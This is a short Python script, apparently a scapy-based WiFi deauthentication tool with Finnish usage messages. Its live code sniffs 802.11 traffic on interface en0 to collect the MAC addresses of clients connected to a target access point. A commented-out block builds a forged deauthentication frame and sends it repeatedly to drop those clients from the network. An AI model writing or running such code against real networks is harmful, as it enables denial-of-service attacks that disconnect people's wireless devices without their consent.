#!/usr/bin/env python

import sys

if len(sys.argv) != 3:
    print ("Miten: ./scapy-deauth.py bssid aika")
    print ("BSSIDS: airport -s")
    sys.exit(1)

from scapy import all
from scapy.all import *
# conf.verb = 0 # Silence scapy

conf.iface = "en0"
bssid = sys.argv[1]
time = int(sys.argv[2])
clients = []


'''
packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7)

for n in range(int(count)):
	sendp(packet)
	print ('Deauth lahetetty: ' + conf.iface + ' to BSSID: ' + bssid + ' for Client: ' + client)
'''  

def cb(p):
    if p.haslayer(Dot11):
        print("here")
        if p.addr1 and p.addr2:                                                                         
            if bssid.lower() == p.addr1.lower():                   
                #if p.type in [1, 2]:                                 
                if p.addr2 not in clients and p.addr2 != '':
                    clients.append(p.addr2)
                    print(p.addr2)

sniff(iface=conf.iface, prn=cb, timeout = time)
